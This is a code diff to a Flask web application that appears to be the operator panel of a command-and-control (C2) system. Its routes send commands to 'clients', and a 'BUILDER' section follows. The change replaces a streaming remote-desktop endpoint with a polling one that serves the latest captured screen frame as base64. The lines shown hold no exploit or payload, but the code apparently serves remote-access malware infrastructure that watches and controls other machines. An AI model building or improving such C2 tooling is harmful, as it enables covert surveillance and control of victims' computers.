@@ -932,43 +932,29 @@ def c2_send_command():
         return jsonify({'error': 'send failed'}), 500
 
 
-# ===== REMOTE DESKTOP SSE STREAM =====
+# ===== REMOTE DESKTOP FRAME ENDPOINT =====
 
-@app.route('/api/c2/stream/<client_id>')
+@app.route('/api/c2/frame/<client_id>')
 @login_required
-def c2_stream(client_id):
+def c2_get_frame(client_id):
     user = request.current_user
-    with get_db() as db:
-        client = db.execute('SELECT client_id FROM clients WHERE client_id = ? AND user_id = ?', (client_id, user['id'])).fetchone()
-        if not client:
-            return jsonify({'error': 'not found'}), 404
+    with rdp_frames_lock:
+        frame = rdp_frames.get(client_id)
+    if not frame:
+        return '', 204
 
-    def generate():
-        yield ": ping\n\n"
+    try:
+        last_ts = float(request.args.get('ts', 0))
+    except (ValueError, TypeError):
         last_ts = 0
-        ping_counter = 0
-        while True:
-            with rdp_frames_lock:
-                frame = rdp_frames.get(client_id)
-            if frame and frame['ts'] > last_ts:
-                last_ts = frame['ts']
-                b64 = base64.b64encode(frame['data']).decode('ascii')
-                yield f"data:{b64}\n\n"
-                ping_counter = 0
-            else:
-                ping_counter += 1
-                if ping_counter >= 30: # every ~1.5s keepalive ping to force buffer flush
-                    yield ": keepalive\n\n"
-                    ping_counter = 0
-            time.sleep(0.05)
 
-    return Response(generate(), mimetype='text/event-stream',
-                    headers={
-                        'Cache-Control': 'no-cache',
-                        'Content-Type': 'text/event-stream',
-                        'X-Accel-Buffering': 'no',
-                        'Connection': 'keep-alive'
-                    })
+    if frame['ts'] <= last_ts:
+        return '', 304
+
+    return jsonify({
+        'ts': frame['ts'],
+        'b64': base64.b64encode(frame['data']).decode('ascii')
+    })
 
 
 # ===== BUILDER =====
